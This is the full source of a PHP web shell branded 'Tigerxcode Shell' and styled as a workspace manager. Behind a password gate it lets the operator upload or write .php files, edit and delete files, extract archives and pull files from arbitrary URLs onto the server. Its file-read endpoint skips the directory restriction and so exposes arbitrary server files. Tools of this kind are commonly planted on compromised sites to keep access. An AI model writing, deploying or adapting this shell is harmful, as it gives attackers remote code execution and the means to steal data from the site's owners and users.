<?php
// Enable error reporting for debugging (disable in production)

session_start();

// Configuration
$secureAccess = true;
$authPassHash = '$2b$12$85D2HD2Ld8BIeBAObGEKGOL4r7OhmO4pn9AhCT8s3592ft7Aa5v8.'; // Replace with your bcrypt hash
$enableRemoteFetch = true;
$maxUploadSize = 10 * 1024 * 1024; // 10MB
$allowedFileTypes = ['php', 'jpg', 'png', 'zip', 'pdf', 'doc', 'docx'];

// CSRF Token Generation
if (!isset($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// Security check for password protection
if ($secureAccess) {
    if (!isset($_SESSION['secure_session']) || $_SESSION['secure_session'] !== true) {
        if (isset($_POST['secure_key']) && isset($_POST['csrf_token']) && $_POST['csrf_token'] === $_SESSION['csrf_token']) {
            if (password_verify($_POST['secure_key'], $authPassHash)) {
                $_SESSION['secure_session'] = true;
            } else {
                die('
                <!DOCTYPE html>
                <html lang="en">
                <head>
                    <meta charset="UTF-8">
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <title>Access Denied</title>
                    <script src="https://cdn.tailwindcss.com"></script>
                </head>
                <body class="bg-vivid-slate min-h-screen flex items-center justify-center">
                    <div class="bg-white p-8 rounded-xl shadow-xl w-full max-w-md">
                        <h2 class="text-2xl font-bold mb-6 text-center text-vivid-charcoal">Secure Access Required</h2>
                        <form method="POST">
                            <input type="hidden" name="csrf_token" value="' . htmlspecialchars($_SESSION['csrf_token']) . '">
                            <input type="password" name="secure_key" class="w-full p-3 border rounded-lg mb-4 focus:outline-none focus:ring-2 focus:ring-vivid-teal" placeholder="Enter secure key" required autofocus>
                            <button type="submit" class="w-full bg-vivid-teal text-white p-3 rounded-lg hover:bg-vivid-teal-dark transition">Unlock</button>
                        </form>
                    </div>
                </body>
                </html>
                ');
            }
        } else {
            echo '
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Access Denied</title>
                <script src="https://cdn.tailwindcss.com"></script>
            </head>
            <body class="bg-vivid-slate min-h-screen flex items-center justify-center">
                <div class="bg-white p-8 rounded-xl shadow-xl w-full max-w-md">
                    <h2 class="text-2xl font-bold mb-6 text-center text-vivid-charcoal">Secure Access Required</h2>
                    <form method="POST">
                        <input type="hidden" name="csrf_token" value="' . htmlspecialchars($_SESSION['csrf_token']) . '">
                        <input type="password" name="secure_key" class="w-full p-3 border rounded-lg mb-4 focus:outline-none focus:ring-2 focus:ring-vivid-teal" placeholder="Enter secure key" required autofocus>
                        <button type="submit" class="w-full bg-vivid-teal text-white p-3 rounded-lg hover:bg-vivid-teal-dark transition">Unlock</button>
                    </form>
                </div>
            </body>
            </html>
            ';
            exit;
        }
    }
}

// Handle file content retrieval for editing
if (isset($_GET['operation']) && $_GET['operation'] === 'retrieve_file_content' && isset($_GET['item'])) {
    $validatedPath = realpath($_GET['workspace'] . '/' . $_GET['item']);
    if ($validatedPath && is_file($validatedPath) && is_readable($validatedPath)) {
        header('Content-Type: text/plain');
        echo file_get_contents($validatedPath);
        exit;
    } else {
        http_response_code(404);
        echo "Item not found or not readable.";
        exit;
    }
}

// Handle current workspace (directory)
$baseDir = realpath(__DIR__); // Restrict to script's directory
$currentWorkspace = isset($_GET['workspace']) ? realpath($_GET['workspace']) : $baseDir;
if (!$currentWorkspace || !is_dir($currentWorkspace) || !is_readable($currentWorkspace) || strpos($currentWorkspace, $baseDir) !== 0) {
    $currentWorkspace = $baseDir;
    $alertMessage = "Invalid or inaccessible workspace. Reverted to default workspace.";
}

// File operations
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['csrf_token']) && $_POST['csrf_token'] === $_SESSION['csrf_token']) {
    // Create directory
    if (isset($_POST['add_directory']) && !empty($_POST['folder_name'])) {
        $folderName = purifyFileName($_POST['folder_name']);
        $newFolderPath = $currentWorkspace . '/' . $folderName;
        if (!is_dir($newFolderPath)) {
            if (mkdir($newFolderPath, 0755)) {
                $alertMessage = "Folder created successfully.";
            } else {
                $alertMessage = "Failed to create folder.";
            }
        } else {
            $alertMessage = "Folder already exists.";
        }
    }

    // Create file
    if (isset($_POST['add_file']) && !empty($_POST['item_name'])) {
        $itemName = purifyFileName($_POST['item_name']);
        $itemContent = $_POST['item_content'] ?? '';
        $newItemPath = $currentWorkspace . '/' . $itemName;
        if (!file_exists($newItemPath)) {
            if (file_put_contents($newItemPath, $itemContent) !== false) {
                $alertMessage = "File created successfully.";
            } else {
                $alertMessage = "Failed to create file.";
            }
        } else {
            $alertMessage = "File already exists.";
        }
    }

    // Upload file
    if (isset($_FILES['uploaded_item']) && $_FILES['uploaded_item']['error'] === UPLOAD_ERR_OK) {
        $uploadedItem = $_FILES['uploaded_item'];
        $fileExt = strtolower(pathinfo($uploadedItem['name'], PATHINFO_EXTENSION));
        if (in_array($fileExt, $allowedFileTypes) && $uploadedItem['size'] <= $maxUploadSize) {
            $destinationPath = $currentWorkspace . '/' . purifyFileName($uploadedItem['name']);
            if (!file_exists($destinationPath)) {
                if (move_uploaded_file($uploadedItem['tmp_name'], $destinationPath)) {
                    $alertMessage = "Item uploaded successfully.";
                } else {
                    $alertMessage = "Error uploading item.";
                }
            } else {
                $alertMessage = "File already exists.";
            }
        } else {
            $alertMessage = "Invalid file type or size exceeds limit.";
        }
    }

    // Rename item
    if (isset($_POST['rename_item']) && !empty($_POST['original_name']) && !empty($_POST['new_name'])) {
        $originalName = purifyFileName($_POST['original_name']);
        $newName = purifyFileName($_POST['new_name']);
        $originalPath = $currentWorkspace . '/' . $originalName;
        $newPath = $currentWorkspace . '/' . $newName;
        if (file_exists($originalPath) && !file_exists($newPath)) {
            if (rename($originalPath, $newPath)) {
                $alertMessage = "Item renamed successfully.";
            } else {
                $alertMessage = "Error renaming item.";
            }
        } else {
            $alertMessage = "Invalid source or destination name.";
        }
    }

    // Delete item
    if (isset($_POST['delete_item']) && !empty($_POST['item_name'])) {
        $itemName = purifyFileName($_POST['item_name']);
        $itemPath = $currentWorkspace . '/' . $itemName;
        if (file_exists($itemPath)) {
            if (is_dir($itemPath)) {
                $deleteSuccess = deleteDirectory($itemPath);
                $alertMessage = $deleteSuccess ? "Folder deleted successfully." : "Error deleting folder.";
            } elseif (is_file($itemPath)) {
                if (unlink($itemPath)) {
                    $alertMessage = "File deleted successfully.";
                } else {
                    $alertMessage = "Error deleting file.";
                }
            }
        } else {
            $alertMessage = "Item not found.";
        }
    }

    // Unzip archive
    if (isset($_POST['unzip_archive']) && !empty($_POST['archive_name'])) {
        $archiveName = purifyFileName($_POST['archive_name']);
        $archivePath = $currentWorkspace . '/' . $archiveName;
        if (file_exists($archivePath) && class_exists('ZipArchive')) {
            $archive = new ZipArchive;
            if ($archive->open($archivePath) === TRUE) {
                if ($archive->extractTo($currentWorkspace)) {
                    $archive->close();
                    $alertMessage = "Archive extracted successfully.";
                } else {
                    $archive->close();
                    $alertMessage = "Error extracting archive.";
                }
            } else {
                $alertMessage = "Failed to open archive.";
            }
        } else {
            $alertMessage = "Archive not found or ZipArchive not available.";
        }
    }

    // Fetch remote item
    if ($enableRemoteFetch && isset($_POST['fetch_remote']) && !empty($_POST['remote_url'])) {
        $remoteUrl = filter_var($_POST['remote_url'], FILTER_VALIDATE_URL);
        if ($remoteUrl) {
            $itemName = purifyFileName(basename($remoteUrl));
            $localItemPath = $currentWorkspace . '/' . $itemName;
            $fileExt = strtolower(pathinfo($itemName, PATHINFO_EXTENSION));
            if (in_array($fileExt, $allowedFileTypes) && !file_exists($localItemPath)) {
                $remoteContent = @file_get_contents($remoteUrl);
                if ($remoteContent !== false && file_put_contents($localItemPath, $remoteContent) !== false) {
                    $alertMessage = "Item downloaded successfully.";
                } else {
                    $alertMessage = "Error downloading item.";
                }
            } else {
                $alertMessage = "Invalid file type or file already exists.";
            }
        } else {
            $alertMessage = "Invalid remote URL.";
        }
    }

    // Edit file
    if (isset($_POST['modify_file']) && !empty($_POST['item_name'])) {
        $itemName = purifyFileName($_POST['item_name']);
        $itemContent = $_POST['item_content'] ?? '';
        $itemPath = $currentWorkspace . '/' . $itemName;
        if (file_exists($itemPath) && is_writable($itemPath)) {
            if (file_put_contents($itemPath, $itemContent) !== false) {
                $alertMessage = "File updated successfully.";
            } else {
                $alertMessage = "Error updating file.";
            }
        } else {
            $alertMessage = "File not found or not writable.";
        }
    }
}

// List workspace contents
$items = scandir($currentWorkspace);
$folders = [];
$files = [];

foreach ($items as $item) {
    if ($item === '.' || $item === '..') continue;
    $itemPath = $currentWorkspace . '/' . $item;
    if (is_dir($itemPath)) {
        $folders[] = $item;
    } else {
        $files[] = $item;
    }
}
sort($folders);
sort($files);

// Helper functions
function purifyFileName($name) {
    return preg_replace('/[^a-zA-Z0-9._-]/', '', trim($name));
}

function humanizeFileSize($bytes) {
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
    return $bytes . ' bytes';
}

function buildPathCrumbs($path, $baseDir) {
    // Ensure path is within baseDir
    if (strpos($path, $baseDir) !== 0) {
        return '<span class="text-red-500">Invalid path</span>';
    }

    // Get relative path from baseDir
    $relativePath = substr($path, strlen($baseDir));
    $segments = array_filter(explode(DIRECTORY_SEPARATOR, $relativePath));
    $crumbs = [];
    $pathBuilder = $baseDir;

    // Root crumb
    $crumbs[] = '<a href="?workspace=' . urlencode($baseDir) . '" class="text-vivid-teal hover:underline font-semibold">Root</a>';

    // Build crumbs for each segment
    foreach ($segments as $segment) {
        $pathBuilder .= DIRECTORY_SEPARATOR . $segment;
        if (is_dir($pathBuilder) && is_readable($pathBuilder)) {
            $crumbs[] = '<a href="?workspace=' . urlencode($pathBuilder) . '" class="text-vivid-teal hover:underline">' . htmlspecialchars($segment) . '</a>';
        } else {
            $crumbs[] = '<span class="text-gray-500">' . htmlspecialchars($segment) . '</span>';
        }
    }

    return implode(' <span class="text-vivid-charcoal mx-1">/</span> ', $crumbs);
}

function deleteDirectory($dir) {
    if (!file_exists($dir)) return true;
    if (!is_dir($dir)) return unlink($dir);
    foreach (scandir($dir) as $item) {
        if ($item == '.' || $item == '..') continue;
        if (!deleteDirectory($dir . '/' . $item)) return false;
    }
    return rmdir($dir);
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tigerxcode Shell</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
    <style>
        .bg-vivid-slate { background-color: #e2e8f0; }
        .bg-vivid-teal { background-color: #14b8a6; }
        .bg-vivid-teal-dark { background-color: #0f766e; }
        .text-vivid-charcoal { color: #111827; }
        .vivid-transition { transition: all 0.3s ease-in-out; }
        .vivid-hover { transition: transform 0.2s, box-shadow 0.2s; }
        .vivid-hover:hover { transform: translateY(-2px); box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1); }
        .sticky-header th { position: sticky; top: 0; background: #f3f4f6; z-index: 10; }
    </style>
</head>
<body class="bg-vivid-slate min-h-screen">
    <div class="container mx-auto p-6">
        <h1 class="text-4xl font-bold mb-8 text-vivid-charcoal">Tigerxcode Workspace Manager</h1>

        <!-- Path Crumbs -->
        <nav class="mb-6 text-lg flex items-center"><?php echo buildPathCrumbs($currentWorkspace, $baseDir); ?></nav>

        <!-- Alert Message -->
        <?php if (isset($alertMessage)): ?>
            <div class="bg-green-100 border-l-4 border-green-500 text-green-700 p-4 mb-6 rounded-lg" role="alert">
                <?php echo htmlspecialchars($alertMessage); ?>
            </div>
        <?php endif; ?>

        <!-- Action Cards -->
        <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
            <!-- Add Folder -->
            <div class="bg-white p-6 rounded-xl shadow-xl vivid-hover">
                <h3 class="text-xl font-semibold mb-4 text-vivid-charcoal">New Folder</h3>
                <form method="post" class="flex space-x-3">
                    <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
                    <input type="text" name="folder_name" class="flex-1 p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-vivid-teal" placeholder="Folder name" required>
                    <button type="submit" name="add_directory" class="bg-vivid-teal text-white p-3 rounded-lg hover:bg-vivid-teal-dark vivid-transition">Add</button>
                </form>
            </div>

            <!-- Upload Item -->
            <div class="bg-white p-6 rounded-xl shadow-xl vivid-hover">
                <h3 class="text-xl font-semibold mb-4 text-vivid-charcoal">Upload Item</h3>
                <form method="post" enctype="multipart/form-data" class="flex space-x-3">
                    <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
                    <input type="file" name="uploaded_item" class="flex-1 p-3 border rounded-lg" required>
                    <button type="submit" class="bg-vivid-teal text-white p-3 rounded-lg hover:bg-vivid-teal-dark vivid-transition">Upload</button>
                </form>
            </div>

            <!-- Fetch Remote Item -->
            <?php if ($enableRemoteFetch): ?>
                <div class="bg-white p-6 rounded-xl shadow-xl vivid-hover">
                    <h3 class="text-xl font-semibold mb-4 text-vivid-charcoal">Fetch Remote Item</h3>
                    <form method="post" class="flex space-x-3">
                        <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
                        <input type="url" name="remote_url" class="flex-1 p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-vivid-teal" placeholder="https://example.com/item.zip" required>
                        <button type="submit" name="fetch_remote" class="bg-vivid-teal text-white p-3 rounded-lg hover:bg-vivid-teal-dark vivid-transition">Fetch</button>
                    </form>
                </div>
            <?php endif; ?>
        </div>

        <!-- Item Table -->
        <div class="bg-white rounded-xl shadow-xl overflow-x-auto">
            <table class="w-full">
                <thead class="bg-gray-100">
                    <tr class="sticky-header">
                        <th class="p-4 text-left text-vivid-charcoal">Name</th>
                        <th class="p-4 text-left text-vivid-charcoal">Type</th>
                        <th class="p-4 text-left text-vivid-charcoal">Size</th>
                        <th class="p-4 text-left text-vivid-charcoal">Writable</th>
                        <th class="p-4 text-left text-vivid-charcoal">Last Modified</th>
                        <th class="p-4 text-left text-vivid-charcoal">Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <!-- Parent Workspace -->
                    <?php if ($currentWorkspace !== $baseDir): ?>
                        <tr class="border-t hover:bg-gray-50 vivid-transition">
                            <td class="p-4"><i class="fas fa-folder mr-2 text-vivid-teal"></i><a href="?workspace=<?php echo urlencode(dirname($currentWorkspace)); ?>" class="text-vivid-teal hover:underline">.. (Parent Workspace)</a></td>
                            <td class="p-4">-</td>
                            <td class="p-4">-</td>
                            <td class="p-4">-</td>
                            <td class="p-4">-</td>
                            <td class="p-4"></td>
                        </tr>
                    <?php endif; ?>

                    <!-- Folders -->
                    <?php foreach ($folders as $folder): ?>
                        <tr class="border-t hover:bg-gray-50 vivid-transition">
                            <td class="p-4"><i class="fas fa-folder mr-2 text-vivid-teal"></i><a href="?workspace=<?php echo urlencode($currentWorkspace . '/' . $folder); ?>" class="text-vivid-teal hover:underline"><?php echo htmlspecialchars($folder); ?></a></td>
                            <td class="p-4">Folder</td>
                            <td class="p-4">-</td>
                            <td class="p-4"><?php echo is_writable($currentWorkspace . '/' . $folder) ? 'Yes' : 'No'; ?></td>
                            <td class="p-4"><?php echo date("Y-m-d H:i:s", filemtime($currentWorkspace . '/' . $folder)); ?></td>
                            <td class="p-4 space-x-3">
                                <button onclick="openRenameDialog('<?php echo htmlspecialchars($folder); ?>')" class="bg-yellow-500 text-white px-3 py-1 rounded-lg hover:bg-yellow-600 vivid-transition">Rename</button>
                                <button onclick="confirmDelete('<?php echo htmlspecialchars($folder); ?>')" class="bg-red-500 text-white px-3 py-1 rounded-lg hover:bg-red-600 vivid-transition">Delete</button>
                            </td>
                        </tr>
                    <?php endforeach; ?>

                    <!-- Files -->
                    <?php foreach ($files as $file): ?>
                        <tr class="border-t hover:bg-gray-50 vivid-transition">
                            <td class="p-4"><i class="fas fa-file mr-2 text-vivid-teal"></i><?php echo htmlspecialchars($file); ?></td>
                            <td class="p-4"><?php echo strtoupper(pathinfo($file, PATHINFO_EXTENSION)); ?></td>
                            <td class="p-4"><?php echo humanizeFileSize(filesize($currentWorkspace . '/' . $file)); ?></td>
                            <td class="p-4"><?php echo is_writable($currentWorkspace . '/' . $file) ? 'Yes' : 'No'; ?></td>
                            <td class="p-4"><?php echo date("Y-m-d H:i:s", filemtime($currentWorkspace . '/' . $file)); ?></td>
                            <td class="p-4 space-x-3">
                                <button onclick="editItem('<?php echo htmlspecialchars($file); ?>')" class="bg-vivid-teal text-white px-3 py-1 rounded-lg hover:bg-vivid-teal-dark vivid-transition">Edit</button>
                                <button onclick="openRenameDialog('<?php echo htmlspecialchars($file); ?>')" class="bg-yellow-500 text-white px-3 py-1 rounded-lg hover:bg-yellow-600 vivid-transition">Rename</button>
                                <button onclick="confirmDelete('<?php echo htmlspecialchars($file); ?>')" class="bg-red-500 text-white px-3 py-1 rounded-lg hover:bg-red-600 vivid-transition">Delete</button>
                                <?php if (pathinfo($file, PATHINFO_EXTENSION) === 'zip'): ?>
                                    <form method="post" class="inline">
                                        <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
                                        <input type="hidden" name="archive_name" value="<?php echo htmlspecialchars($file); ?>">
                                        <button type="submit" name="unzip_archive" class="bg-green-500 text-white px-3 py-1 rounded-lg hover:bg-green-600 vivid-transition"><i class="fas fa-file-archive mr-1"></i>Unzip</button>
                                    </form>
                                <?php endif; ?>
                            </td>
                        </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>
    </div>

    <!-- Edit Dialog -->
    <div id="editDialog" class="fixed inset-0 bg-gray-600 bg-opacity-50 hidden items-center justify-center vivid-transition">
        <div class="bg-white p-8 rounded-xl shadow-xl w-full max-w-3xl transform scale-95 vivid-transition">
            <h2 class="text-2xl font-bold mb-6 text-vivid-charcoal">Edit Item</h2>
            <form id="editForm" method="post">
                <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
                <input type="hidden" id="editItemName" name="item_name">
                <textarea id="editItemContent" name="item_content" class="w-full h-80 p-3 border rounded-lg mb-6 focus:outline-none focus:ring-2 focus:ring-vivid-teal"></textarea>
                <div class="flex justify-end space-x-3">
                    <button type="submit" name="modify_file" class="bg-green-500 text-white px-5 py-2 rounded-lg hover:bg-green-600 vivid-transition">Save</button>
                    <button type="button" onclick="closeDialog('editDialog')" class="bg-gray-500 text-white px-5 py-2 rounded-lg hover:bg-gray-600 vivid-transition">Cancel</button>
                </div>
            </form>
        </div>
    </div>

    <!-- Rename Dialog -->
    <div id="renameDialog" class="fixed inset-0 bg-gray-600 bg-opacity-50 hidden items-center justify-center vivid-transition">
        <div class="bg-white p-8 rounded-xl shadow-xl w-full max-w-md transform scale-95 vivid-transition">
            <h2 class="text-2xl font-bold mb-6 text-vivid-charcoal">Rename Item</h2>
            <form id="renameForm" method="post">
                <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
                <input type="hidden" id="originalItemName" name="original_name">
                <input type="text" id="newItemName" name="new_name" class="w-full p-3 border rounded-lg mb-6 focus:outline-none focus:ring-2 focus:ring-vivid-teal" required>
                <div class="flex justify-end space-x-3">
                    <button type="submit" name="rename_item" class="bg-green-500 text-white px-5 py-2 rounded-lg hover:bg-green-600 vivid-transition">Save</button>
                    <button type="button" onclick="closeDialog('renameDialog')" class="bg-gray-500 text-white px-5 py-2 rounded-lg hover:bg-gray-600 vivid-transition">Cancel</button>
                </div>
            </form>
        </div>
    </div>

    <script>
        function editItem(itemName) {
            fetch('?workspace=<?php echo urlencode($currentWorkspace); ?>&operation=retrieve_file_content&item=' + encodeURIComponent(itemName))
                .then(response => {
                    if (!response.ok) throw new Error('Item not found');
                    return response.text();
                })
                .then(content => {
                    document.getElementById('editItemName').value = itemName;
                    document.getElementById('editItemContent').value = content;
                    openDialog('editDialog');
                })
                .catch(error => {
                    alert('Error loading item content: ' + error.message);
                });
        }

        function openRenameDialog(itemName) {
            document.getElementById('originalItemName').value = itemName;
            document.getElementById('newItemName').value = itemName;
            openDialog('renameDialog');
        }

        function confirmDelete(itemName) {
            if (confirm(`Are you sure you want to delete "${itemName}"? This action cannot be undone.`)) {
                const form = document.createElement('form');
                form.method = 'post';
                form.innerHTML = `
                    <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
                    <input type="hidden" name="item_name" value="${itemName}">
                    <input type="hidden" name="delete_item" value="1">
                `;
                document.body.appendChild(form);
                form.submit();
            }
        }

        function openDialog(dialogId) {
            const dialog = document.getElementById(dialogId);
            dialog.classList.remove('hidden');
            dialog.classList.add('flex');
            setTimeout(() => {
                dialog.querySelector('.transform').classList.remove('scale-95');
            }, 10);
        }

        function closeDialog(dialogId) {
            const dialog = document.getElementById(dialogId);
            dialog.querySelector('.transform').classList.add('scale-95');
            setTimeout(() => {
                dialog.classList.add('hidden');
                dialog.classList.remove('flex');
            }, 300);
        }

        // Client-side form validation
        document.querySelectorAll('form').forEach(form => {
            form.addEventListener('submit', (e) => {
                const inputs = form.querySelectorAll('input[required], textarea[required]');
                let valid = true;
                inputs.forEach(input => {
                    if (!input.value.trim()) {
                        valid = false;
                        input.classList.add('border-red-500');
                    } else {
                        input.classList.remove('border-red-500');
                    }
                });
                if (!valid) {
                    e.preventDefault();
                    alert('Please fill in all required fields.');
                }
            });
        });
    </script>
</body>
</html>